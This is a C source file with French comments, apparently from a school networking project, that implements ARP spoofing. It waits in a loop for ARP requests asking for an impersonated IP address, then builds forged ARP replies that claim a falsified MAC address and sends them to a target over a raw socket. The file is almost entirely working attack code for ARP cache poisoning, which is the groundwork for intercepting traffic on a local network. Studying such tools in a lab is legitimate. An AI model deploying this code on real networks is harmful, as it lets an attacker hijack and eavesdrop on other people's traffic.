#include "ft_malcom.h"

/*
** Attend en boucle arrivé d'une requête ARP qui demande l'IP de la machine qu'on usurpe.
*/
int	wait_arp_request(int raw_socket_fd, t_config *cfg)
{
	unsigned char	buffer[42];
	t_arp_packet	*arp;
	int				check;

	arp = (t_arp_packet *)(buffer + sizeof(t_ethernet_frame));
	while (g_running)
	{
		check = recvfrom(raw_socket_fd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (check < 0)
		{
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				continue;
			perror("recvfrom() error");
			exit(2);
		}
		if (ntohs(arp->operation) == ARP_REQUEST
			&& arp->target_ip == cfg->source_ip.s_addr)
			return (1);
	}
	return (0);
}


/*
** Remplit le paquet ARP falsifié.
** Le mensonge : on annonce que source_ip correspond à source_mac (falsifié).
*/
static void	fill_arp_packet(t_arp_packet *arp, t_config *cfg)
{
	arp->hw_type = htons(1);
	arp->proto_type = htons(ETH_P_IP);
	arp->hw_len = MAC_LEN;
	arp->proto_len = IPV4_LEN;
	arp->operation = htons(ARP_REPLY);
	ft_memcpy(arp->sender_mac, cfg->source_mac, MAC_LEN);
	arp->sender_ip = cfg->source_ip.s_addr;
	ft_memcpy(arp->target_mac, cfg->target_mac, MAC_LEN);
	arp->target_ip = cfg->target_ip.s_addr;
}

/*
** Construit et envoie une réponse ARP falsifiée à la cible.
*/
int	send_arp_reply(int raw_socket_fd, t_config *cfg, const char *interface)
{
	t_ethernet_frame	eth;
	t_arp_packet		arp;
	uint8_t				buffer[sizeof(eth) + sizeof(arp)];
	struct sockaddr_ll	device;
	int					check;

	// Header Ethernet
	ft_memcpy(eth.dest_mac, cfg->target_mac, MAC_LEN);
	ft_memcpy(eth.src_mac, cfg->source_mac, MAC_LEN);
	eth.ethertype = htons(ETH_P_ARP);

	// Paquet ARP
	fill_arp_packet(&arp, cfg);

	// On colle eth + arp dans le buffer
	ft_memcpy(buffer, &eth, sizeof(eth));
	ft_memcpy(buffer + sizeof(eth), &arp, sizeof(arp));

	// Indication sur quelle interface réseau envoyer la trame
	memset(&device, 0, sizeof(device));
	device.sll_family = AF_PACKET;
	device.sll_ifindex = if_nametoindex(interface);
	device.sll_halen = MAC_LEN;
	ft_memcpy(device.sll_addr, cfg->target_mac, MAC_LEN);
	// Envoie de la trame
	check = sendto(raw_socket_fd, buffer, sizeof(buffer), 0,
			(struct sockaddr *)&device, sizeof(device));
	if (check < 0)
	{
		perror("sendto() error");
		exit(2);
	}
	return (1);
}